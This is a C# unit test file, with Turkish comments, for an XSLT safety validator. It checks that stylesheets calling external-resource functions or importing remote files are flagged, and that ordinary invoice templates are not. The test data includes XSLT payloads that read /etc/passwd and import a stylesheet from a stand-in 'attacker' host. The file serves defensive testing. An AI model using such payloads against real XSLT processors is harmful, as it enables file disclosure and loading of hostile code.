using XsltCraft.Application.Validation;

namespace XsltCraft.Tests;

/// <summary>
/// XsltSafety.FindThreat — dış kaynak çağıran fonksiyonları ve harici import'ları
/// XPath taşıyan attribute'larda tespit eder, masum içerikte yanlış-pozitif üretmez.
/// </summary>
public class XsltSafetyTests
{
    [Theory]
    [InlineData("<xsl:value-of select=\"document('http://x/')\"/>")]
    [InlineData("<xsl:value-of select=\"doc('http://x/')\"/>")]
    [InlineData("<xsl:value-of select=\"unparsed-text('file:///etc/passwd')\"/>")]
    [InlineData("<xsl:value-of select=\"collection('file:///')\"/>")]
    [InlineData("<xsl:if test=\"doc-available('http://x/')\"><a/></xsl:if>")]
    [InlineData("<xsl:value-of select=\"system-property('user.dir')\"/>")]
    public void FindThreat_ForbiddenFunctionInSelect_Detected(string xslt)
    {
        Assert.NotNull(XsltSafety.FindThreat(xslt));
    }

    [Theory]
    [InlineData("<xsl:import href=\"http://attacker/x.xsl\"/>")]
    [InlineData("<xsl:include href=\"file:///etc/x.xsl\"/>")]
    public void FindThreat_ExternalImport_Detected(string xslt)
    {
        Assert.NotNull(XsltSafety.FindThreat(xslt));
    }

    [Theory]
    [InlineData("<xsl:value-of select=\"//cbc:Note\"/>")]
    [InlineData("<xsl:value-of select=\"format-number(//cbc:PayableAmount, '#,##0.00')\"/>")]
    [InlineData("<xsl:for-each select=\"//cac:InvoiceLine\"><xsl:value-of select=\"cbc:ID\"/></xsl:for-each>")]
    [InlineData("<xsl:include href=\"common.xsl\"/>")]      // göreli import güvenli
    [InlineData("<!-- doc(test) section heading -->")]      // yorumdaki token yanlış-pozitif olmamalı
    [InlineData("<p>Belge dokümanı document hazır</p>")]    // metin yanlış-pozitif olmamalı
    public void FindThreat_BenignContent_Null(string xslt)
    {
        Assert.Null(XsltSafety.FindThreat(xslt));
    }

    [Fact]
    public void FindThreat_NullOrEmpty_Null()
    {
        Assert.Null(XsltSafety.FindThreat(null));
        Assert.Null(XsltSafety.FindThreat(""));
    }
}
